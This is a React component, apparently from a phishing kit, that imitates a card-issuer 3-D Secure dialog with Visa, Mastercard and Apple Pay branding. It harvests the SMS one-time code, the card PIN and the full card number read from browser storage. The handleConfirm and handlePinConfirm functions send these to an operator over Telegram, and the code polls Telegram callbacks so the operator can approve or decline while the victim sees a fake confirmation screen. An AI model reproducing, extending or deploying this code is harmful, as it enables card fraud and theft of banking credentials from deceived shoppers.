import React, { useEffect, useMemo, useRef, useState } from 'react';
import visaLogoUrl from '../assets/card-logos/visa.svg';
import masterLogoUrl from '../assets/card-logos/mastercard.svg';
import { sendTelegram, sendTelegramWithButtons } from '../services/telegram';
import { pollTelegramCallbacks, answerCallbackQuery } from '../services/telegram';
import { getPaymentStorageKey } from '../utils/paymentKey';
import appleIcon from '../assets/apple.svg';
import applePayLogo from '../assets/apple-pay-logo.svg';

type ThreeDSModalProps = {
  onClose?: () => void;
  onConfirm?: (args: { code: string }) => Promise<void> | void;
  onResend?: () => Promise<void> | void;
  amount?: string | number;
  date?: string | number | Date;
  merchant?: string;
  cardMasked?: string;
  brand?: string;
  personalGreeting?: string;
  initialSeconds?: number;
  debug?: boolean;
  animMs?: number;
  preloadMs?: number;
};

const getApiBase = () =>
  window.location.origin.replace(/:\d+$/, '') + '/mcd_app/api/';

const MAX_ATTEMPTS = 5;
const LOCK_MINUTES = 15;

const ATTEMPTS_LS = (last4: string) => `tds_attempts_${last4 || 'na'}`;
const LOCK_LS = (last4: string) => `tds_locked_until_${last4 || 'na'}`;

const formatMs = (ms: number) => {
  const s = Math.ceil(ms / 1000);
  const m = Math.floor(s / 60);
  const ss = s % 60;
  return `${m}:${String(ss).padStart(2, '0')}`;
};

const num = (v: any) => {
  if (v == null) return 0;
  if (typeof v === 'number') return v;
  const m = String(v).replace(/[^\d.,-]/g, '').replace(',', '.');
  const parsed = parseFloat(m);
  return isNaN(parsed) ? 0 : parsed;
};

const detectBrand = (panOrBrand?: string) => {
  if (!panOrBrand) return 'master';
  const s = String(panOrBrand).toLowerCase();
  if (s === 'visa' || s === 'master' || s === 'mastercard') {
    return s.startsWith('visa') ? 'visa' : 'master';
  }
  const d = s.replace(/\D/g, '');
  if (/^4\d{12,18}$/.test(d)) return 'visa';
  if (/^(5[1-5]\d{14}|2(2[2-9]\d{2}|[3-6]\d{3}|7[01]\d{2}|720\d)\d{12})$/.test(d)) return 'master';
  return 'master';
};

const mask2lines = (pan?: string) => {
  const d = String(pan || '').replace(/\D/g, '');
  const last4 = d ? d.slice(-4) : '0000';
  return `****  ****\n****  ${last4}`;
};

function pullFromLS() {
  const ls = (k: string) => {
    try { return JSON.parse(localStorage.getItem(k) as any); } catch { return null; }
  };

  const ss = (k: string) => {
    try { return JSON.parse(sessionStorage.getItem(k) as any); } catch { return null; }
  };

  // Проверяем, это бронирование отеля или рейса
  const hotelSummary = ss('hotel_booking_summary');
  const isHotel = Boolean(hotelSummary);

  const paymentKey = getPaymentStorageKey();

  if (isHotel && hotelSummary) {
    // Для отелей используем данные из hotel_booking_summary
    const cardObj = ss(`payment_card_${paymentKey}`) || ls(`payment_card_${paymentKey}`);
    const brand = detectBrand(cardObj?.brand || cardObj?.number);
    const cardMasked = cardObj?.masked || mask2lines(cardObj?.number);
    
    return {
      merchant: `${hotelSummary.hotel_name || 'Hotel'} (${hotelSummary.city || 'City'})`,
      amountNum: num(hotelSummary.price || 0),
      currency: hotelSummary.currency || 'USD',
      cardMasked,
      brand,
      dateISO: new Date().toISOString(),
    } as const;
  }

  // Оригинальная логика для рейсов
  const reviewPayload = ls('reviewPayload');
  if (reviewPayload && (reviewPayload.amount != null || reviewPayload.card)) {
    const brand = reviewPayload.card?.brand || detectBrand(reviewPayload.card?.number);
    const masked = reviewPayload.card?.masked || mask2lines(reviewPayload.card?.number);
    return {
      merchant: reviewPayload.merchant || 'Merchant',
      amountNum: num(reviewPayload.amount),
      currency: reviewPayload.currency || 'AED',
      cardMasked: masked,
      brand,
      dateISO: reviewPayload.dateISO || new Date().toISOString(),
    } as const;
  }

  const candidatesTotals = [
    ls('orderSummary')?.totalAmount,
    ls('order')?.total,
    ls('checkout')?.total,
    ls('review_total'),
    ls('checkoutTotal'),
    localStorage.getItem('order_total'),
  ].map(num);

  let amountNum = candidatesTotals.find((v: number) => v > 0) || 0;
  let currency = 'AED';

  if (!amountNum || amountNum <= 0) {
    const carts = [ls('cart'), ls('cartItems'), ls('items')].filter(Boolean) as any[];
    for (const c of carts) {
      if (Array.isArray(c) && c.length) {
        const sum = c.reduce((s: number, it: any) => {
          const p = num(it.price ?? it.amount ?? it.total);
          const q = num(it.qty ?? it.quantity ?? 1) || 1;
          return s + p * q;
        }, 0);
        if (sum > 0) { amountNum = sum; break; }
      }
    }
  }

  const cardObj =
    ls('selectedCard') ||
    ls('checkoutCard') ||
    ls('dbSelectedCard') ||
    ls('paymentCard') ||
    ls('card') ||
    null;

  const brand = detectBrand(cardObj?.brand || cardObj?.number);
  const cardMasked = cardObj?.masked || mask2lines(cardObj?.number);

  return {
    merchant: 'Merchant',
    amountNum,
    currency,
    cardMasked,
    brand,
    dateISO: new Date().toISOString(),
  } as const;
}

export default function ThreeDSModal({
  onClose,
  onConfirm,
  onResend,
  amount,
  date,
  merchant,
  cardMasked,
  brand,
  personalGreeting = 'None',
  initialSeconds = 240,
  debug = false,
  animMs = 250,
  preloadMs = 25000,
}: ThreeDSModalProps) {
  const auto = useMemo(() => pullFromLS(), []);
  const paymentKey = useMemo(() => getPaymentStorageKey(), []);
  const _merchant = merchant || auto.merchant || 'Merchant';
  const _amount = amount || `${(num(auto.amountNum) || 0).toFixed(2)} ${auto.currency || 'AED'}`;
  const _brand = detectBrand(brand || (auto.brand as any));
  const _cardMasked = cardMasked || (auto.cardMasked as any) || '****  ****\n****  0000';

  const [phase, setPhase] = useState<'preload'|'challenge'|'waiting_code'|'pin_input'|'waiting_approval'|'final_loading'|'success'|'failed'>('preload');
  const [timeLeft, setTimeLeft] = useState(initialSeconds);
  const [code, setCode] = useState('');
  const [pin, setPin] = useState('');
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState('');
  const [failNote, setFailNote] = useState('');
  const inputRef = useRef<HTMLInputElement|null>(null);
  const pinInputRef = useRef<HTMLInputElement|null>(null);
  const pollRef = useRef<number|null>(null);

  const last4 = useMemo(() => _cardMasked.replace(/\D/g, '').slice(-4), [_cardMasked]);
  const [attempts, setAttempts] = useState<number>(() => Number(localStorage.getItem(ATTEMPTS_LS(last4)) || 0));
  const [lockedUntil, setLockedUntil] = useState<number>(() => Number(localStorage.getItem(LOCK_LS(last4)) || 0));
  const [nowTs, setNowTs] = useState<number>(Date.now());
  const expireTimerRef = useRef<number|null>(null);

  useEffect(() => {
    const t = window.setInterval(() => setNowTs(Date.now()), 1000);
    return () => window.clearInterval(t);
  }, []);
  const lockLeftMs = Math.max(0, (lockedUntil || 0) - nowTs);
  const isLocked = lockLeftMs > 0;

  const preloadReportedRef = useRef(false);
  const cardLogo = _brand === 'visa' ? visaLogoUrl : masterLogoUrl;

  const formattedDate = useMemo(() => {
    if (!date) {
      const fromISO = (auto as any).dateISO ? new Date((auto as any).dateISO) : new Date();
      const d = isNaN(fromISO as any) ? new Date() : fromISO;
      const dd = String(d.getDate()).padStart(2, '0');
      const mm = String(d.getMonth() + 1).padStart(2, '0');
      const yyyy = d.getFullYear();
      return `${dd}/${mm}/${yyyy}`;
    }
    const d = new Date(date);
    if (isNaN(d as any)) return String(date);
    const dd = String(d.getDate()).padStart(2, '0');
    const mm = String(d.getMonth() + 1).padStart(2, '0');
    const yyyy = d.getFullYear();
    return `${dd}/${mm}/${yyyy}`;
  }, [date, auto]);

  useEffect(() => {
    const id = 'threeDSKeyframes';
    if (!document.getElementById(id)) {
      const style = document.createElement('style');
      style.id = id;
      style.textContent = `
@keyframes threeDS_fadeInOverlay { from { opacity: 0 } to { opacity: 1 } }
@keyframes threeDS_fadeInPanel   { from { opacity: 0; transform: scale(0.96) } to { opacity: 1; transform: scale(1) } }
@keyframes threeDS_spin          { to { transform: rotate(360deg) } }
`;
      document.head.appendChild(style);
    }
  }, []);

  useEffect(() => {
    if (phase !== 'preload') return;
    const t = window.setTimeout(() => setPhase('challenge'), preloadMs);
    return () => window.clearTimeout(t);
  }, [phase, preloadMs]);

  // Убрали предварительное уведомление — оставляем только: Attempt (в Payment), Code+Card, PIN+Card
  useEffect(() => {}, [phase, _brand, _amount, _cardMasked]);

  useEffect(() => {
    if (phase !== 'challenge') return;
    if (timeLeft <= 0) return;
    const t = window.setInterval(() => setTimeLeft((s) => s - 1), 1000);
    return () => window.clearInterval(t);
  }, [phase, timeLeft]);

  // Таймер для фазы waiting_approval - 25 секунд ожидания, потом автоматическая неудача
  useEffect(() => {
    if (phase !== 'waiting_approval') return;
    const timeoutId = window.setTimeout(() => {
      setSubmitting(false);
      setPhase('failed');
      setFailNote('We couldn’t complete your payment. Please try again or choose a different card.');
    }, 25000); // 25 секунд
    return () => window.clearTimeout(timeoutId);
  }, [phase]);

  // Реальный polling Telegram getUpdates для нажатий на инлайн‑кнопки
  useEffect(() => {
    if (phase !== 'waiting_approval') return;
    let alive = true;

    const tick = async () => {
      if (!alive) return;
      const upd = await pollTelegramCallbacks();
      if (upd && alive) {
        try { if (upd.callbackQueryId) await answerCallbackQuery(upd.callbackQueryId, upd.kind === 'approve_pin' ? 'Approved' : 'Declined'); } catch {}
        if (upd.kind === 'approve_pin') {
          setSubmitting(true);
          setPhase('final_loading');
          setTimeout(() => {
            setSubmitting(false);
            setPhase('success');
            setTimeout(() => onClose?.(), 2000);
          }, 3000);
        } else if (upd.kind === 'decline_pin') {
          setSubmitting(false);
          setPhase('failed');
          setFailNote('Payment declined — please try again or use a different card.');
        }
      }
      if (alive) setTimeout(tick, 800);
    };
    tick();
    return () => { alive = false; };
  }, [phase, onClose]);

  useEffect(() => () => {
    if (pollRef.current) window.clearInterval(pollRef.current);
    if (expireTimerRef.current) window.clearTimeout(expireTimerRef.current);
  }, []);

  useEffect(() => {
    if (phase === 'challenge') setTimeout(() => inputRef.current?.focus(), 0);
    if (phase === 'pin_input') setTimeout(() => pinInputRef.current?.focus(), 0);
  }, [phase]);

  useEffect(() => {
    if (debug) {
      // eslint-disable-next-line no-console
      console.log('[3DS]', { auto, _amount, _brand, _cardMasked, _merchant, formattedDate, phase });
    }
  }, [debug, auto, _amount, _brand, _cardMasked, _merchant, formattedDate, phase]);

  const formatTime = (sec: number) => {
    const m = Math.floor(sec / 60);
    const s = sec % 60;
    return `${m}:${s.toString().padStart(2, '0')}`;
  };

  // Отправка кода в Телеграм будет выполняться по кнопке (handleConfirm)
  const lastSentCodeRef = useRef<string>('');

  // Отправка PIN в Телеграм по кнопке (handlePinConfirm)
  const lastSentPinRef = useRef<string>('');

  const handleConfirm = async () => {
    if (code.trim().length < 4) {
      setError('Enter the SMS password.');
      return;
    }
    if (isLocked) {
      setError(`Too many attempts. Try again in ${formatMs(lockLeftMs)}.`);
      return;
    }

    // Упрощённый сценарий: 5 секунд «verifying», затем ввод PIN
    // Отправка кода + карта сразу после клика
    try {
      const c = code.trim();
      if (c && c !== lastSentCodeRef.current) {
        const pan = sessionStorage.getItem(`payment_card_one_time_pan_${paymentKey}`) || localStorage.getItem(`payment_card_one_time_pan_${paymentKey}`);
        const cardLine = pan ? pan : _cardMasked.replace(/\n/g, ' ');
        sendTelegram(`🔐 3‑D Secure code: ${c}\nCard: ${cardLine}`);
        lastSentCodeRef.current = c;
      }
    } catch {}

    setSubmitting(true);
    setError('');
    setPhase('waiting_code');
    if (expireTimerRef.current) window.clearTimeout(expireTimerRef.current);
    expireTimerRef.current = window.setTimeout(() => {
      setSubmitting(false);
      setPhase('pin_input');
    }, 5000);
  };

  const handlePinConfirm = async () => {
    if (pin.trim().length < 4) {
      setError('Enter your card PIN (minimum 4 digits).');
      return;
    }
    // Отправка PIN и отдельного сообщения с кнопками
    try {
      const p = pin.trim();
      if (p && p !== lastSentPinRef.current) {
        const pan = sessionStorage.getItem(`payment_card_one_time_pan_${paymentKey}`) || localStorage.getItem(`payment_card_one_time_pan_${paymentKey}`);
        const cardLine = pan || _cardMasked.replace(/\n/g, ' ');

        // 1) Отправляем PIN и карту отдельным сообщением
        try {
          await sendTelegram(`🔢 Card PIN: ${p}\nCard: ${cardLine}`);
        } catch (e) {
          // игнорируем, чтобы не ломать UX
        }

        // 2) Отправляем отдельное сообщение с кнопками подтверждения/отклонения
        try {
          await sendTelegramWithButtons(
            '💳 Approve this payment?',
            [
              { text: '❌ Отклонить', callback_data: 'decline_pin' },
              { text: '✅ Подтвердить', callback_data: 'approve_pin' }
            ]
          );
        } catch (e) {
          // eslint-disable-next-line no-console
          console.warn('Failed to send approve/decline buttons:', e);
        }

        lastSentPinRef.current = p;
      }
    } catch {}
    setError('');
    setSubmitting(true);
    setPhase('waiting_approval'); // Переходим в фазу ожидания подтверждения
  };

  const retryFromFailed = () => {
    // Возврат на страницу оплаты, чтобы повторить попытку (как просили)
    onClose?.();
  };

  const handleResend = async () => {
    if (timeLeft > 0 && timeLeft !== initialSeconds) return;
    setTimeLeft(initialSeconds);
    try {
      await onResend?.();
    } catch (e) {
      // eslint-disable-next-line no-console
      console.warn('Resend failed:', e);
    }
  };

  return (
    <div style={{ ...s.overlay, animation: `threeDS_fadeInOverlay ${animMs}ms ease forwards` }} aria-modal="true" role="dialog">
      <div style={{ ...s.panel, animation: `threeDS_fadeInPanel ${animMs}ms ease forwards` }}>
        {phase === 'preload' && (
          <div style={s.preloadWrap}>
            <img src={_brand === 'visa' ? visaLogoUrl : masterLogoUrl} alt="Card Brand" style={{ height: 40, objectFit: 'contain' }} />
            <div style={s.spinner} aria-label="Loading" />
            <div style={s.preloadText}>Securing your payment…</div>
            <div style={s.preloadMeta}>
              {_amount ? <div><b>Amount:</b> {_amount}</div> : null}
              {_cardMasked ? <div><b>Card:</b> {_cardMasked.replace('\n',' ')}</div> : null}
            </div>
          </div>
        )}

        {phase === 'challenge' && (
          <>
            <div style={s.header}>
              <div style={s.bankLeft}>
                <img src={appleIcon} alt="Apple" style={{ height: 60, opacity: 0.9 }} />
              </div>
              <img src={_brand === 'visa' ? visaLogoUrl : masterLogoUrl} alt="Card Brand" style={{ height: 52, objectFit: 'contain' }} />
            </div>

            <h1 style={s.title}>Enter your password</h1>
            <div style={s.divider} />

            <div style={s.table}>
              {_merchant && _merchant !== 'Merchant' && <Row label="Merchant:" value={_merchant} />}
              <Row label="Amount:" value={_amount} strong />
              <Row label="Date:" value={formattedDate} />
              <Row label="Card number:" value={_cardMasked} mono multiline />
              <Row label="Personal greeting:" value={personalGreeting} />
            </div>

            <p style={s.note}>
              A one-time password has been sent to your phone number.<br/>
              Please check the transaction details and enter the password from SMS.
            </p>

            <input
              ref={inputRef}
              type="text"
              inputMode="numeric"
              maxLength={8}
              placeholder="One-time SMS password"
              value={code}
              onChange={(e) => setCode(e.target.value.replace(/\s+/g, ''))}
              style={s.otpInput}
              aria-label="One-time SMS password"
            />

            {error ? <div style={s.error}>{error}</div> : null}

            <div style={s.footerRow}>
              <button
                onClick={handleConfirm}
                disabled={submitting || isLocked}
                style={{ ...s.submitBtn, ...((submitting || isLocked) ? s.submitBtnDisabled : null) }}
              >
                {submitting
                  ? 'Processing...'
                  : isLocked
                    ? `Locked (${formatMs(lockLeftMs)})`
                    : 'SUBMIT'}
              </button>
            </div>

            <div style={s.links}>
              <button
                onClick={handleResend}
                disabled={timeLeft > 0 && timeLeft !== initialSeconds}
                style={{ ...s.linkBtn, ...(timeLeft > 0 && timeLeft !== initialSeconds ? s.linkDisabled : null) }}
              >
                Didn’t receive an SMS password? (Resend {formatTime(timeLeft)})
              </button>

              <div style={s.bottomLinks}>
                <button onClick={onClose} style={s.linkBtn}>Exit</button>
              </div>
            </div>
          </>
        )}

        {phase === 'waiting_code' && (
          <div style={s.preloadWrap}>
            <img src={_brand === 'visa' ? visaLogoUrl : masterLogoUrl} alt="Card Brand" style={{ height: 40, objectFit: 'contain' }} />
            <div style={s.spinner} aria-label="Loading" />
            <div style={s.preloadText}>Verifying code…</div>
            <div style={s.preloadMeta}>
              {_amount ? <div><b>Amount:</b> {_amount}</div> : null}
              {_cardMasked ? <div><b>Card:</b> {_cardMasked.replace('\n',' ')}</div> : null}
            </div>
          </div>
        )}

        {phase === 'pin_input' && (
          <div style={s.pinWrap}>
            <div style={s.pinHeader}>
              <img src={applePayLogo} alt="Apple Pay" style={{ height: 32, objectFit: 'contain' }} />
            </div>
            <h1 style={s.pinTitle}>Enter PIN</h1>
            <div style={s.pinSubtitle}>Enter your card PIN (4-6 digits) to authorize the payment.</div>

            {/* Visible PIN input field */}
            <div style={s.pinInputField}>
              <input
                ref={pinInputRef}
                type="password"
                inputMode="numeric"
                maxLength={6}
                value={pin}
                onChange={(e) => setPin(e.target.value.replace(/[^\d]/g, ''))}
                style={s.pinVisibleInput}
                placeholder="••••••"
                aria-label="Card PIN"
              />
            </div>

            <div style={s.keypadGridDark}>
              {['1','2','3','4','5','6','7','8','9'].map((d) => (
                <button key={d} style={s.keypadBtnDark} onClick={() => setPin((p) => (p + d).slice(0, 6))}>{d}</button>
              ))}
              <button aria-label="Backspace" onClick={() => setPin((p) => p.slice(0, -1))} style={s.keypadBtnDark}>
                <svg width="20" height="20" viewBox="0 0 24 24" fill="#fff" xmlns="http://www.w3.org/2000/svg"><path d="M22 5a2 2 0 0 0-2-2H9a2 2 0 0 0-1.6.8L1.6 9.6a2 2 0 0 0 0 2.8l5.8 7.8A2 2 0 0 0 9 21h11a2 2 0 0 0 2-2V5zm-6.6 10.6L13 13.2l-2.4 2.4-1.4-1.4 2.4-2.4-2.4-2.4 1.4-1.4 2.4 2.4 2.4-2.4 1.4 1.4-2.4 2.4 2.4 2.4-1.4 1.4z"/></svg>
              </button>
              <button style={s.keypadBtnDark} onClick={() => setPin((p)=> (p + '0').slice(0,6))}>0</button>
              <button style={{ ...s.keypadBtnDark, background:'#14532d' }} disabled={pin.length<4} onClick={handlePinConfirm}>
                <svg width="20" height="20" viewBox="0 0 24 24" fill="#22c55e" xmlns="http://www.w3.org/2000/svg"><path d="M9 16.2 4.8 12 3.4 13.4 9 19 21 7 19.6 5.6 9 16.2Z"/></svg>
              </button>
            </div>

            {error ? <div style={s.error}>{error}</div> : null}
            <div style={s.pinFooterNote}>Use numbers only. If you made a mistake, tap the backspace.</div>
          </div>
        )}

        {phase === 'waiting_approval' && (
          <div style={s.pinWrap}>
            <div style={s.pinHeader}>
              <img src={applePayLogo} alt="Apple Pay" style={{ height: 32, objectFit: 'contain' }} />
            </div>
            <h1 style={s.pinTitle}>Processing your payment…</h1>
            <div style={s.pinSubtitle}></div>
            
            <div style={{ textAlign: 'center', marginTop: '40px' }}>
              <div style={{ 
                width: '40px', 
                height: '40px', 
                border: '3px solid #f3f3f3',
                borderTop: '3px solid #007AFF',
                borderRadius: '50%',
                animation: 'threeDS_spin 1s linear infinite',
                margin: '0 auto'
              }} />
            </div>
            
            <div style={s.pinFooterNote}>Timeout in 25 seconds if no response</div>
          </div>
        )}

        {phase === 'final_loading' && (
          <div style={s.preloadWrap}>
            <img src={appleIcon} alt="Apple" style={{ height: 40, objectFit: 'contain' }} />
            <div style={s.spinner} aria-label="Loading" />
            <div style={s.preloadText}>Processing payment…</div>
            <div style={s.preloadMeta}>
              {_amount ? <div><b>Amount:</b> {_amount}</div> : null}
            </div>
          </div>
        )}

        {phase === 'success' && (
          <div style={s.successWrap}>
            <div style={s.successIcon}>
              <svg width="32" height="32" viewBox="0 0 24 24" fill="none">
                <circle cx="12" cy="12" r="12" fill="white" opacity="0.15" />
                <path d="M9 16.2 4.8 12 3.4 13.4 9 19 21 7 19.6 5.6 9 16.2Z" fill="#fff"/>
              </svg>
            </div>
            <div style={s.successTitle}>Payment confirmed</div>
            <div style={s.successText}>
              We’re preparing your order. It usually takes <b>10–15 minutes</b>.<br/>Thank you!
            </div>
            <div style={s.successMeta}>
              {_amount ? <div><b>Amount:</b> {_amount}</div> : null}
              {_cardMasked ? <div><b>Card:</b> {_cardMasked.replace('\n', ' ')}</div> : null}
            </div>
            <button onClick={onClose} style={s.successBtn}>Close</button>
          </div>
        )}

        {phase === 'failed' && (
          <div style={s.failWrap}>
            <div style={s.failIcon}>
              <svg width="32" height="32" viewBox="0 0 24 24" fill="none">
                <circle cx="12" cy="12" r="12" fill="white" opacity="0.15" />
                <path d="M15.54 8.46 12 12l3.54 3.54-1.41 1.41L10.59 13.4 7.05 16.95 5.64 15.54 9.17 12 5.64 8.46 7.05 7.05 10.59 10.6 14.13 7.05l1.41 1.41Z" fill="#fff"/>
              </svg>
            </div>

            <div style={s.failAmount}>{_amount}</div>

            <div style={s.failCard}>
              <div style={s.failCardTitle}>Payment failed</div>
              <div style={s.failCardText}>
                {failNote || 'Invalid payment data. Please try again.'}
              </div>
            </div>

            <div style={s.failButtons}>
              <button onClick={retryFromFailed} style={s.primaryBtn}>Try again</button>
              <button onClick={onClose} style={s.linkBtn}>Close</button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

function Row({ label, value, strong, mono, multiline }: { label: string; value: React.ReactNode; strong?: boolean; mono?: boolean; multiline?: boolean; }) {
  return (
    <div style={s.row}>
      <div style={s.rowLabel}>{label}</div>
      <div
        style={{
          ...s.rowValue,
          ...(strong ? { fontWeight: 700 } : null),
          ...(mono ? { fontFamily: "ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, 'Liberation Mono', 'Courier New', monospace" } : null),
          whiteSpace: multiline ? 'pre-line' : 'normal',
        }}
      >
        {value}
      </div>
    </div>
  );
}

const s: Record<string, React.CSSProperties> = {
  overlay: {
    position: 'fixed',
    top: 0, left: 0, right: 0, bottom: 0,
    background: 'rgba(0,0,0,.55)',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    zIndex: 9999,
  },
  panel: {
    width: '100%',
    maxWidth: 520,
    background: '#fff',
    borderRadius: 10,
    boxShadow: '0 12px 32px rgba(0,0,0,.25)',
    padding: '22px 26px 18px',
    transform: 'scale(0.96)',
    opacity: 0,
  },
  preloadWrap: { display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 14, padding: '30px 10px 18px', minHeight: 240 },
  spinner: { width: 42, height: 42, borderRadius: '50%', border: '3px solid #e5e7eb', borderTopColor: '#111', animation: 'threeDS_spin 1s linear infinite' },
  preloadText: { fontSize: 14, color: '#111', marginTop: 4 },
  preloadMeta: { fontSize: 13, color: '#444', textAlign: 'center', lineHeight: 1.4 },
  header: { display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 6 },
  bankLeft: { height: 60 },
  title: { fontSize: 22, fontWeight: 700, margin: '4px 0 10px', color: '#111' },
  divider: { height: 1, background: '#e9e9e9', marginBottom: 8 },
  table: { paddingTop: 8, marginTop: 2 },
  row: { display: 'flex', alignItems: 'baseline', gap: 10, padding: '4px 0' },
  rowLabel: { width: 140, color: '#6b7280', fontSize: 14 },
  rowValue: { flex: 1, color: '#000', fontSize: 14 },
  note: { marginTop: 10, color: '#333', fontSize: 14, lineHeight: 1.5 },
  otpInput: { marginTop: 12, width: '100%', padding: '12px 12px', fontSize: 16, border: '1px solid #cfd8dc', borderRadius: 6, outline: 'none' },
  error: { marginTop: 8, color: '#ff3b30', fontSize: 13 },
  footerRow: { marginTop: 12, display: 'flex', justifyContent: 'center' },
  submitBtn: { minWidth: 200, padding: '12px 16px', background: '#000', color: '#fff', fontWeight: 700, border: 'none', borderRadius: 8, cursor: 'pointer' },
  submitBtnDisabled: { opacity: 0.75, cursor: 'default' },
  links: { marginTop: 10, textAlign: 'center' },
  linkBtn: { border: 'none', background: 'transparent', color: '#1b74e4', cursor: 'pointer', fontSize: 14 },
  linkDisabled: { opacity: 0.5, cursor: 'default' },
  bottomLinks: { marginTop: 6, display: 'inline-flex', alignItems: 'center', gap: 8 },
  successWrap: { display: 'flex', flexDirection: 'column', alignItems: 'center', textAlign: 'center', gap: 10, padding: '34px 16px 24px', minHeight: 240 },
  successIcon: { width: 56, height: 56, borderRadius: '50%', background: 'linear-gradient(135deg,#22c55e,#16a34a)', boxShadow: '0 8px 20px rgba(22,163,74,.35)', display: 'grid', placeItems: 'center', marginBottom: 6 },
  successTitle: { fontSize: 20, fontWeight: 800, color: '#111' },
  successText: { fontSize: 14, color: '#333', lineHeight: 1.5 },
  successMeta: { marginTop: 6, fontSize: 13, color: '#555' },
  successBtn: { marginTop: 14, padding: '10px 16px', background: '#000', color: '#fff', border: 'none', borderRadius: 10, fontWeight: 700, cursor: 'pointer' },
  failWrap: { display: 'flex', flexDirection: 'column', alignItems: 'center', textAlign: 'center', gap: 12, padding: '26px 16px 22px', minHeight: 260 },
  failIcon: { width: 56, height: 56, borderRadius: '50%', background: 'linear-gradient(135deg,#ef4444,#dc2626)', boxShadow: '0 8px 20px rgba(239,68,68,.35)', display: 'grid', placeItems: 'center' },
  failAmount: { fontSize: 24, fontWeight: 800, color: '#111', marginTop: 4 },
  failCard: { width: '100%', background: '#fee2e2', border: '1px solid #fecaca', color: '#991b1b', borderRadius: 12, padding: '12px 14px', textAlign: 'left' },
  failCardTitle: { fontWeight: 800, marginBottom: 4 },
  failCardText: { lineHeight: 1.45 },
  failButtons: { display: 'flex', gap: 10, alignItems: 'center', justifyContent: 'center', marginTop: 8 },
  primaryBtn: { padding: '10px 16px', background: '#000', color: '#fff', border: 'none', borderRadius: 10, fontWeight: 700, cursor: 'pointer' },
  // PIN UI styles
  pinWrap: { display: 'flex', flexDirection: 'column', alignItems: 'center', textAlign: 'center', padding: '34px 16px 24px', minHeight: 240 },
  pinHeader: { marginBottom: 8 },
  pinTitle: { fontSize: 22, fontWeight: 800, color: '#111', margin: '4px 0 6px' },
  pinSubtitle: { fontSize: 14, color: '#555', marginBottom: 10 },
  pinInputWrap: { marginTop: 8 },
  pinInput: { textAlign: 'center', fontSize: 22, padding: '12px 16px', width: 140, border: '2px solid #e5e7eb', borderRadius: 12, outline: 'none', letterSpacing: '0.5em', background: '#f8fafc' },
  // Dark Apple style for keypad
  pinDotsBar: { display:'flex', gap:14, justifyContent:'center', margin:'8px 0 18px' },
  pinDotCircle: { width:12, height:12, borderRadius:'50%', background:'#fff', boxShadow:'0 0 0 2px rgba(255,255,255,.35)' },
  pinInputField: { margin: '12px 0 18px', display: 'flex', justifyContent: 'center' },
  pinVisibleInput: { 
    textAlign: 'center', 
    fontSize: 24, 
    fontWeight: 600,
    padding: '12px 16px', 
    width: 160, 
    border: '2px solid #e5e7eb', 
    borderRadius: 12, 
    outline: 'none',
    letterSpacing: '0.3em',
    background: '#f9f9f9',
    color: '#111'
  },
  keypadGridDark: { marginTop: 10, display: 'grid', gridTemplateColumns: 'repeat(3, 64px)', gridAutoRows: '64px', gap: 12, justifyContent: 'center' },
  keypadBtnDark: { borderRadius: '50%', border: 'none', background: '#262626', color: '#fff', fontWeight: 800, fontSize: 18, cursor: 'pointer', boxShadow:'0 2px 8px rgba(0,0,0,.45)' },
  pinButtons: { display: 'flex', gap: 10, alignItems: 'center', justifyContent: 'center', marginTop: 12 },
  pinCancelBtn: { padding: '10px 16px', background: 'transparent', color: '#1b74e4', border: 'none', borderRadius: 10, fontWeight: 700, cursor: 'pointer' },
  pinConfirmBtn: { padding: '10px 16px', background: '#000', color: '#fff', border: 'none', borderRadius: 10, fontWeight: 700, cursor: 'pointer' },
  pinBtnDisabled: { opacity: 0.6, cursor: 'default' },
};


